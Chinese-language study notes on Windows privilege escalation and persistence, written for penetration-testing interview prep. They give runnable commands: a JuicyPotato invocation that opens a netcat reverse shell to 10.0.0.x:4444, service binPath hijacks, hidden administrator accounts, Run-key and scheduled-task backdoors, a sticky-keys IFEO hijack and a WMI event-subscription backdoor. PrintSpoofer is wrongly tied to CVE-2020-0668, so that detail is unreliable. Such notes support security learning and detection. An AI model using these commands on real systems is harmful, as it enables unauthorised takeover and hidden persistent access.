# Windows 提权与权限维持学习笔记

Windows 提权与权限维持是内网渗透中极其重要的一环。本笔记记录从普通用户提升至 SYSTEM/Administrator，以及留下后门维持权限的核心手法。

## 一、基础信息收集

拿到 Windows Shell 后，首先做信息收集，为提权寻找突破口。

```cmd
:: 当前用户与权限
whoami
whoami /priv
whoami /groups

:: 系统信息（打补丁情况）
systeminfo

:: 用户与组
net user
net localgroup administrators

:: 网络信息
ipconfig /all
netstat -ano

:: 查找敏感文件
dir /s /b *pass* *config* *bak*
```

**自动化工具**：上传 `PowerUp.ps1` 或 `WinPEAS.exe` 进行快速枚举。

```powershell
powershell -exec bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
```

## 二、Windows 提权常见手法

### 1. Potato 系列（烂土豆家族）

**原理**：利用 Windows 的令牌模拟机制（Token Impersonation）和 NTLM 中继，将低权限用户的令牌替换为 SYSTEM 令牌。

| 工具 | 适用版本 | 说明 |
|:---|:---|:---|
| **RottenPotato** | Win7/2008 | 最早的土豆，已淘汰 |
| **JuicyPotato** | Win7-Win10 1809 / Server 2019 | 利用 DCOM 和 BITS 服务 |
| **SweetPotato** | 综合版 | 支持多种 COM 接口，成功率更高 |
| **GodPotato** | Win8-Win11 / Server 2012-2022 | 当前主流，利用 RPCSS 服务 |

**利用示例（JuicyPotato）**：
```cmd
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe -e cmd.exe 10.0.0.x 4444" -t *
```

**面试重点**：土豆系列的核心是 **SeImpersonatePrivilege** 权限。如果 `whoami /priv` 里看到这个权限，且系统版本符合，就可以尝试土豆提权。

### 2. PrintSpoofer (CVE-2020-0668)

**原理**：利用 Windows Print Spooler 服务的命名管道，进行令牌模拟提权。适用于 Win10 1809+ / Server 2019+。

```cmd
PrintSpoofer.exe -i -c cmd
```

**面试重点**：PrintSpoofer 和 Potato 的思路一样，都是利用令牌模拟，但利用的是 Spooler 服务的管道。

### 3. 服务配置错误提权

- **未加引号的服务路径**：如果服务路径包含空格且未加引号（如 `C:\Program Files\My Service\service.exe`），Windows 会依次尝试执行 `C:\Program.exe`、`C:\Program Files\My.exe`。如果我们在 `C:\` 下有写权限，就可以放置恶意程序。
- **弱服务权限**：使用 `accesschk.exe` 检查服务权限，如果普通用户对服务有 `SERVICE_CHANGE_CONFIG` 权限，可以修改服务的 `binPath` 指向恶意程序。

```cmd
sc qc <服务名>
sc config <服务名> binPath= "cmd.exe /c net user hacker$ P@ssw0rd /add"
sc start <服务名>
```

## 三、Windows 权限维持（后门）

提权到 SYSTEM/Administrator 后，需要留下后门，以便在目标重启或密码更改后仍能控制目标。

### 1. 隐藏用户

```cmd
:: 创建隐藏用户（末尾加 $ 符号）
net user admin$ P@ssw0rd123 /add
net localgroup administrators admin$ /add
```
**踩坑记录**：Windows 创建用户必须用 `net user`，不能漏掉 `net`。

### 2. 注册表开机自启

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Update /d "cmd.exe /c net user hacker$ P@ss123 /add" /f
```
**特点**：注册表 Run 键在用户登录时执行（普通用户权限）。计划任务可以在系统启动时以 SYSTEM 权限执行，更隐蔽。

### 3. 计划任务后门

```cmd
schtasks /create /tn "SystemUpdate" /tr "cmd.exe /c net user task$ P@ssw0rd@123 /add && net localgroup administrators task$ /add" /sc onstart /ru system /f
```

### 4. 粘滞键后门（IFEO 劫持）

**原理**：利用 Windows 的映像文件执行选项（IFEO），将 `sethc.exe`（粘滞键程序）的调试器设置为 `cmd.exe`。在登录界面连按 5 次 Shift，就会弹出一个 SYSTEM 权限的 CMD。

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f
```

### 5. WMI 事件订阅后门

**原理**：利用 WMI 的三个组件（`__EventFilter`、`CommandLineEventConsumer`、`__FilterToConsumerBinding`），实现无文件、持久化的后门。

```powershell
# 利用 PowerSploit 的 Persistence 模块快速创建 WMI 后门
Import-Module .\Persistence.ps1
$Filter = Create-WmiEventFilter -Name "WindowsUpdate" -Query "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$Consumer = Create-WmiEventConsumer -Name "WindowsUpdate" -Command "cmd.exe /c net user wmi$ P@ssw0rd /add"
Create-WmiEventBinding -Filter $Filter -Consumer $Consumer
```

## 四、面试高频问题

**Q1：Windows 提权有哪些常见方式？**
A：Potato 系列（利用 `SeImpersonatePrivilege` 权限）、PrintSpoofer、服务配置错误（未加引号的服务路径、弱服务权限）、内核漏洞（如 MS16-032、CVE-2021-1732）、计划任务等。

**Q2：土豆系列提权的核心原理是什么？**
A：核心是 Windows 的令牌模拟机制。当攻击者拥有 `SeImpersonatePrivilege` 权限时，可以通过 NTLM 中继或 DCOM 调用，诱使 SYSTEM 权限的进程与自己连接，然后模拟其令牌，从而获取 SYSTEM 权限。

**Q3：隐藏用户和注册表后门有什么区别？**
A：隐藏用户（末尾加 `$`）是创建一个实际存在的账号，但用 `net user` 看不到，需要用 `net user admin$` 查询。注册表后门是在开机时执行命令（如创建账号），属于持久化触发机制。两者经常结合使用。

**Q4：如何检测粘滞键后门？**
A：检测注册表 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe` 是否被设置了 `Debugger` 值。正常系统不应该有此项。

**Q5：WMI 后门的优点是什么？**
A：WMI 后门是无文件落地、系统原生的持久化机制。由于它存储在 WMI 仓库中，不依赖注册表或文件系统，隐蔽性很强，且触发机制稳定。
